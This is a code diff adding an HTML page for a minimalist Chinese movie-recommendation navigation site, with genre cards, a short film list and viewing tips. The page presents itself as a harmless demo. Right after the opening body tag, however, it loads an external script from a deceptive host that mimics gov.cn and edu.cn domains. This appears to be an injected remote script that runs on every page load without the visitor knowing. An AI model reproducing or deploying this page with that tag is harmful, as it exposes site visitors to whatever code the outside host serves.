@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>一看电影网 - 快速找片/一眼分类/不用想直接看 | 一看电影网</title>
+<meta name="description" content="一看电影网（yikandianyingwang-h5）是快速找片导航站：打开就看到分类、片单和推荐，不用注册、不用选画质、不用翻页，像用搜索引擎一样快，手机端一屏搞定。">
+<meta name="keywords" content="一看电影网, yikandianyingwang-h5, 快速找片, 一眼分类电影, 不用想直接看, 电影导航, 极简电影站">
+<meta name="author" content="一看电影网">
+<meta name="robots" content="index,follow">
+<style>
+:root{
+  --white:#ffffff;--bg:#fafafa;--bg2:#f2f2f2;--ink:#0d0d0d;--ink2:#333;--text:#1a1a1a;--text2:#666;
+  --red:#ff2d2d;--green:#00c853;--line:#e0e0e0;--radius:12px;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  background:var(--bg);
+  color:var(--text);
+  font-family:'SF Pro Display','PingFang SC','Microsoft YaHei',system-ui,sans-serif;
+  line-height:1.7;font-size:15px;min-height:100vh;overflow-x:hidden;
+}
+a{color:inherit;text-decoration:none}
+ul{list-style:none}
+
+.topbar{position:sticky;top:0;z-index:100;background:rgba(255,255,255,.96);backdrop-filter:blur(8px);border-bottom:1px solid var(--line)}
+.topbar-inner{max-width:1200px;margin:0 auto;padding:10px 20px;display:flex;align-items:center;justify-content:space-between}
+.logo{font-size:22px;font-weight:900;display:flex;align-items:center;gap:8px}
+.logo .glass{width:22px;height:22px;border:3px solid var(--red);border-radius:50%;position:relative}
+.logo .glass::after{content:'';position:absolute;width:8px;height:3px;background:var(--red);bottom:-5px;right:-6px;transform:rotate(45deg);border-radius:0 0 2px 0}
+.logo b{color:var(--red)}
+.fast-tag{font-size:11px;font-weight:800;color:#fff;background:var(--ink);padding:3px 10px;border-radius:4px;font-family:ui-monospace,monospace}
+.nav-menu{display:flex;gap:16px}
+.nav-menu a{color:var(--text2);font-size:13px;font-weight:700;padding:4px 2px;position:relative}
+.nav-menu a:hover{color:var(--ink)}
+.nav-menu a::after{content:'';position:absolute;left:0;bottom:-2px;height:2px;width:0;background:var(--ink);transition:.2s}
+.nav-menu a:hover::after{width:100%}
+
+.hero{position:relative;z-index:1;padding:54px 20px 36px;background:linear-gradient(180deg,#fff,var(--bg))}
+.hero-inner{max-width:1200px;margin:0 auto;text-align:center}
+.kicker{display:inline-block;font-size:11px;letter-spacing:3px;color:#fff;background:var(--red);padding:4px 14px;border-radius:4px;font-family:ui-monospace,monospace;margin-bottom:16px}
+.hero h1{font-size:clamp(34px,6vw,56px);font-weight:900;line-height:1.05;margin-bottom:14px;letter-spacing:-1px}
+.hero h1 .hl{color:var(--red)}
+.hero p{color:var(--text2);font-size:15px;max-width:540px;margin:0 auto 26px;line-height:1.9}
+
+/* 搜索意图条 */
+.intent-bar{max-width:680px;margin:0 auto 22px;display:flex;gap:8px;flex-wrap:wrap;justify-content:center}
+.intent-btn{padding:8px 16px;background:#fff;border:1px solid var(--line);border-radius:99px;font-size:13px;font-weight:700;color:var(--text2);cursor:pointer;transition:.2s;font-family:inherit}
+.intent-btn:hover,.intent-btn.active{background:var(--ink);color:#fff;border-color:var(--ink)}
+
+.hero-btns{display:flex;gap:12px;justify-content:center;flex-wrap:wrap}
+.btn-a{padding:13px 30px;background:var(--ink);color:#fff;font-weight:800;border-radius:8px;transition:.2s}
+.btn-a:hover{transform:translateY(-2px);box-shadow:0 12px 24px rgba(0,0,0,.2)}
+.btn-b{padding:13px 30px;border:2px solid var(--ink);color:var(--ink);font-weight:800;border-radius:8px;transition:.2s}
+.btn-b:hover{background:var(--ink);color:#fff}
+
+/* 放大镜装饰 */
+.glass-deco{width:120px;height:120px;margin:0 auto 24px;border:6px solid var(--red);border-radius:50%;position:relative;opacity:.12}
+.glass-deco::after{content:'';position:absolute;width:36px;height:6px;background:var(--red);bottom:-14px;right:-18px;transform:rotate(45deg);border-radius:0 0 4px 0}
+
+.section{max-width:1200px;margin:0 auto;padding:44px 20px;position:relative;z-index:1}
+.sec-head{margin-bottom:26px;text-align:center}
+.sec-head h2{font-size:26px;font-weight:900;display:inline-block;background:var(--ink);color:#fff;padding:8px 20px;border-radius:8px}
+.sec-head h2 .ac{color:var(--red)}
+.sec-head p{color:var(--text2);font-size:13px;margin-top:10px}
+
+/* 一眼分类 */
+.quick-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:16px}
+.quick-card{background:#fff;border:1px solid var(--line);border-radius:var(--radius);padding:22px 18px;text-align:center;cursor:pointer;transition:.25s;position:relative}
+.quick-card:hover{transform:translateY(-4px);box-shadow:0 14px 28px rgba(0,0,0,.1);border-color:var(--ink)}
+.quick-card .bigicon{font-size:38px;margin-bottom:8px;display:block}
+.quick-card h3{font-size:16px;font-weight:800;margin-bottom:4px}
+.quick-card p{font-size:12px;color:var(--text2);line-height:1.7}
+.quick-card .tag{position:absolute;top:12px;right:12px;font-size:10px;font-weight:800;padding:2px 8px;border-radius:99px;font-family:ui-monospace,monospace}
+.tag.hot{background:rgba(255,45,45,.1);color:var(--red)}
+.tag.new{background:rgba(0,200,83,.1);color:var(--green)}
+.tag.easy{background:rgba(0,0,0,.05);color:var(--text2)}
+
+/* 快速片单 */
+.list-section{background:var(--bg2)}
+.film-table{width:100%;border-collapse:collapse;background:#fff;border-radius:12px;overflow:hidden;border:1px solid var(--line)}
+.film-table thead th{background:var(--ink);color:#fff;padding:12px 16px;text-align:left;font-size:13px;font-weight:800}
+.film-table tbody td{padding:13px 16px;border-bottom:1px solid var(--line);font-size:13px;color:var(--text);cursor:pointer;transition:.15s}
+.film-table tbody tr:hover{background:var(--bg)}
+.film-table tbody tr:last-child td{border-bottom:none}
+.film-table .type{font-weight:800;color:var(--red)}
+.film-table .time{font-family:ui-monospace,monospace;color:var(--text2);font-size:12px}
+
+/* 效率指南 */
+.guide-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:18px}
+.guide{background:#fff;border-top:4px solid var(--ink);border-radius:10px;padding:20px;transition:.25s}
+.guide:nth-child(2){border-top-color:var(--red)}
+.guide:nth-child(3){border-top-color:var(--green)}
+.guide:hover{transform:translateY(-4px);box-shadow:0 12px 24px rgba(0,0,0,.08)}
+.guide h3{font-size:16px;font-weight:800;margin-bottom:8px}
+.guide p{font-size:13px;color:var(--text2);line-height:1.8}
+.guide ol{padding-left:18px;margin-top:8px}
+.guide ol li{font-size:12px;color:var(--text);padding:3px 0;line-height:1.7}
+
+.about-section{}
+.about-card{max-width:800px;margin:0 auto;background:#fff;border:2px solid var(--ink);border-radius:14px;padding:30px;text-align:center}
+.about-card h3{font-size:18px;font-weight:900;margin-bottom:12px}
+.about-card p{font-size:13px;color:var(--text2);line-height:1.95;margin-bottom:10px}
+
+.footer{background:var(--ink);color:#fff;padding:32px 20px 20px;text-align:center}
+.footer-logo{font-size:20px;font-weight:900;margin-bottom:10px}
+.footer-logo .hl{color:var(--red)}
+.footer-links{display:flex;gap:16px;justify-content:center;flex-wrap:wrap;margin-bottom:14px}
+.footer-links a{font-size:12px;color:rgba(255,255,255,.7)}
+.footer-links a:hover{color:var(--red)}
+.footer-copy{font-size:11px;border-top:1px solid rgba(255,255,255,.15);padding-top:14px;line-height:1.9;color:rgba(255,255,255,.5)}
+.footer-copy a{color:var(--red)}
+
+@media(max-width:980px){
+  .quick-grid{grid-template-columns:repeat(2,1fr)}
+  .guide-grid{grid-template-columns:1fr}
+}
+@media(max-width:880px){
+  .nav-menu{gap:10px;flex-wrap:wrap;justify-content:center}
+  .topbar-inner{flex-direction:column;gap:8px}
+  .hero{padding:32px 16px 24px;margin-top:104px}
+  .section{padding:34px 16px}
+  .sec-head h2{font-size:22px}
+  .film-table{font-size:12px}
+  .film-table thead th:nth-child(3),.film-table tbody td:nth-child(3){display:none}
+}
+@media(max-width:520px){
+  .quick-grid{grid-template-columns:1fr}
+  .intent-bar{gap:6px}
+  .intent-btn{padding:6px 12px;font-size:12px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="topbar">
+  <div class="topbar-inner">
+    <div class="logo"><span class="glass"></span>一看电影网</div>
+    <div class="fast-tag">QUICK PICK</div>
+    <nav>
+      <ul class="nav-menu">
+        <li><a href="#quick">一眼分类</a></li>
+        <li><a href="#list">快速片单</a></li>
+        <li><a href="#guide">看片效率</a></li>
+        <li><a href="#about">关于一看</a></li>
+      </ul>
+    </nav>
+  </div>
+</div>
+
+<section class="hero">
+  <div class="hero-inner">
+    <div class="glass-deco"></div>
+    <span class="kicker">yikandianyingwang-h5 · 打开就看</span>
+    <h1><span class="hl">一看</span>就懂 · 一看就选 · 一看就看</h1>
+    <p>不想翻页、不想注册、不想在十几个分类里纠结。一看电影网把"找片"压缩成三步：你选一个意图，我给你一个片单，你点开就看。就这么简单。</p>
+    <div class="intent-bar">
+      <div class="intent-btn active">随便看看</div>
+      <div class="intent-btn">今天想哭</div>
+      <div class="intent-btn">今天想笑</div>
+      <div class="intent-btn">周末大片</div>
+      <div class="intent-btn">陪爸妈看</div>
+      <div class="intent-btn">睡不着</div>
+    </div>
+    <div class="hero-btns">
+      <a href="#quick" class="btn-a">🔍 开始一看</a>
+      <a href="#list" class="btn-b">直接看片单</a>
+    </div>
+  </div>
+</section>
+
+<section id="quick" class="section">
+  <div class="sec-head">
+    <h2>👁️ <span class="ac">一眼分类</span> · 点一下就够</h2>
+    <p>不用翻页，不用筛选，一屏全看到</p>
+  </div>
+  <div class="quick-grid">
+    <div class="quick-card"><span class="tag hot">HOT</span><span class="bigicon">💥</span><h3>爽片</h3><p>爆炸、追车、打架、拯救世界。脑子放空，眼睛吃冰。</p></div>
+    <div class="quick-card"><span class="tag new">NEW</span><span class="bigicon">🧠</span><h3>烧脑</h3><p>反转、时间线、多重人格。看完要查解析的那种。</p></div>
+    <div class="quick-card"><span class="tag easy">EASY</span><span class="bigicon">😂</span><h3>好笑</h3><p>合家欢、黑色幽默、脱口秀电影。适合任何心情。</p></div>
+    <div class="quick-card"><span class="tag hot">HOT</span><span class="bigicon">😭</span><h3>催泪</h3><p>生离死别、遗憾错过。备好纸巾，别在公共场合看。</p></div>
+    <div class="quick-card"><span class="bigicon">👻</span><h3>吓人</h3><p>恐怖、惊悚、悬疑。晚上别看，看完别照镜子。</p></div>
+    <div class="quick-card"><span class="bigicon">🏰</span><h3>奇幻</h3><p>魔法、神话、异世界。逃离现实的快捷键。</p></div>
+    <div class="quick-card"><span class="bigicon">🚀</span><h3>科幻</h3><p>太空、AI、末日、时间旅行。想象力的天花板。</p></div>
+    <div class="quick-card"><span class="tag easy">EASY</span><span class="bigicon">☕</span><h3>安静</h3><p>慢节奏、文艺、纪录片。适合下雨天下午。</p></div>
+  </div>
+</section>
+
+<section id="list" class="section list-section">
+  <div class="sec-head">
+    <h2>📋 <span class="ac">快速片单</span> · 12 部不用想的</h2>
+    <p>点行看详情</p>
+  </div>
+  <table class="film-table">
+    <thead><tr><th>片名</th><th>一句话</th><th>类型</th><th>时长</th></tr></thead>
+    <tbody>
+      <tr><td>盗梦空间</td><td>梦里套梦，最后陀螺转没转？</td><td class="type">烧脑</td><td class="time">2h28m</td></tr>
+      <tr><td>楚门的世界</td><td>你的人生是别人的真人秀。</td><td class="type">好笑/烧脑</td><td class="time">1h43m</td></tr>
+      <tr><td>星际穿越</td><td>爸爸穿过黑洞给女儿打电话。</td><td class="type">催泪/科幻</td><td class="time">2h49m</td></tr>
+      <tr><td>让子弹飞</td><td>站着把钱挣了。</td><td class="type">爽片/好笑</td><td class="time">2h12m</td></tr>
+      <tr><td>招魂</td><td>驱魔人一家接单记。</td><td class="type">吓人</td><td class="time">1h52m</td></tr>
+      <tr><td>千与千寻</td><td>吃了会变成猪的饭，别吃。</td><td class="type">奇幻/安静</td><td class="time">2h05m</td></tr>
+      <tr><td>摔跤吧！爸爸</td><td>印度女孩摔出个世界冠军。</td><td class="type">催泪/爽片</td><td class="time">2h41m</td></tr>
+      <tr><td>禁闭岛</td><td>你是病人还是探员？看完再说。</td><td class="type">烧脑/吓人</td><td class="time">2h18m</td></tr>
+      <tr><td>寻梦环游记</td><td>真正的死亡是被遗忘。</td><td class="type">催泪/奇幻</td><td class="time">1h45m</td></tr>
+      <tr><td>疯狂的石头</td><td>一块翡翠引发的连锁搞笑。</td><td class="type">好笑</td><td class="time">1h46m</td></tr>
+      <tr><td>银翼杀手2049</td><td>人是什么？复制人又是什么？</td><td class="type">科幻/安静</td><td class="time">2h44m</td></tr>
+      <tr><td>寄生虫</td><td>地下室的人上了楼。</td><td class="type">烧脑/爽片</td><td class="time">2h12m</td></tr>
+    </tbody>
+  </table>
+</section>
+
+<section id="guide" class="section">
+  <div class="sec-head">
+    <h2>⚡ <span class="ac">看片效率指南</span></h2>
+    <p>怎么用最少时间找到最对的片</p>
+  </div>
+  <div class="guide-grid">
+    <div class="guide">
+      <h3>🎯 30 秒决策法</h3>
+      <p>问自己三个问题，答案出来片就出来了：</p>
+      <ol>
+        <li>今天想动脑还是放空？</li>
+        <li>想一个人看还是有人陪？</li>
+        <li>有 90 分钟还是 3 小时？</li>
+      </ol>
+    </div>
+    <div class="guide">
+      <h3>📱 手机看片最优解</h3>
+      <p>手机屏幕小，选片有讲究：</p>
+      <ol>
+        <li>动作/喜剧优先——字幕少、节奏快</li>
+        <li>文艺/对话多片留到大屏</li>
+        <li>戴耳机！外放毁所有</li>
+        <li>下载比在线稳，地铁尤其</li>
+      </ol>
+    </div>
+    <div class="guide">
+      <h3>🕐 时段匹配</h3>
+      <p>什么时间看什么片，效率最高：</p>
+      <ol>
+        <li>早上：纪录片、安静片</li>
+        <li>午休：短片、喜剧、15分钟以内</li>
+        <li>下班路上：爽片、动作</li>
+        <li>深夜：烧脑、恐怖、催泪</li>
+      </ol>
+    </div>
+  </div>
+</section>
+
+<section id="about" class="section about-section">
+  <div class="sec-head">
+    <h2>👁️ <span class="ac">关于一看</span></h2>
+    <p>为什么叫"一看"</p>
+  </div>
+  <div class="about-card">
+    <h3>打开就看，不用想</h3>
+    <p>很多电影站把分类做得比图书馆还复杂：按国家、按年代、按导演、按演员、按评分、按标签……选了十分钟还没开始看。</p>
+    <p>一看电影网只做一件事：让你在 30 秒内决定看什么。分类只有八个，片单只有十二行，效率指南三句话。剩下的时间，留给电影本身。</p>
+    <p>本页是单页导航演示：所有卡片点击弹说明，内链用 <code>#</code> 占位，不存视频、不嵌盗链、不破解会员。真实部署时接正版平台入口。</p>
+  </div>
+</section>
+
+<div class="footer">
+  <div class="footer-logo">👁️ 一看<span class="hl">电影网</span></div>
+  <div class="footer-links">
+    <a href="#quick">一眼分类</a>
+    <a href="#list">快速片单</a>
+    <a href="#guide">看片效率</a>
+    <a href="#about">关于一看</a>
+  </div>
+  <div class="footer-copy">
+    &copy; 2026 一看电影网 (yikandianyingwang-h5). 快速找片导航演示站.<br>
+    网站地址: <a href="https://yikandianyingwang-h5.github.io">https://yikandianyingwang-h5.github.io</a><br>
+    <span style="opacity:.8">打开就看 · 不用想 · 直接看</span>
+  </div>
+</div>
+
+<script>
+document.querySelectorAll('.quick-card').forEach(function(c){c.addEventListener('click',function(){alert(this.querySelector('h3').textContent+'\n\n'+this.querySelector('p').textContent);});});
+document.querySelectorAll('.film-table tbody tr').forEach(function(r){r.addEventListener('click',function(){alert(this.querySelector('td').textContent+'\n'+this.querySelectorAll('td')[1].textContent+'\n类型：'+this.querySelector('.type').textContent+' · 时长：'+this.querySelector('.time').textContent);});});
+document.querySelectorAll('.intent-btn').forEach(function(b){b.addEventListener('click',function(){document.querySelectorAll('.intent-btn').forEach(function(x){x.classList.remove('active')});this.classList.add('active');alert('意图：'+this.textContent+'\n\n→ 跳转到匹配片单（演示：内链 #）');});});
+document.querySelectorAll('.guide').forEach(function(g){g.addEventListener('click',function(){alert(this.querySelector('h3').textContent+'\n\n'+this.querySelector('p').textContent);});});
+document.querySelectorAll('.nav-menu a').forEach(function(a){a.addEventListener('click',function(e){e.preventDefault();var el=document.querySelector(this.getAttribute('href'));if(el)el.scrollIntoView({behavior:'smooth'});});});
+</script>
+</body>
+</html>
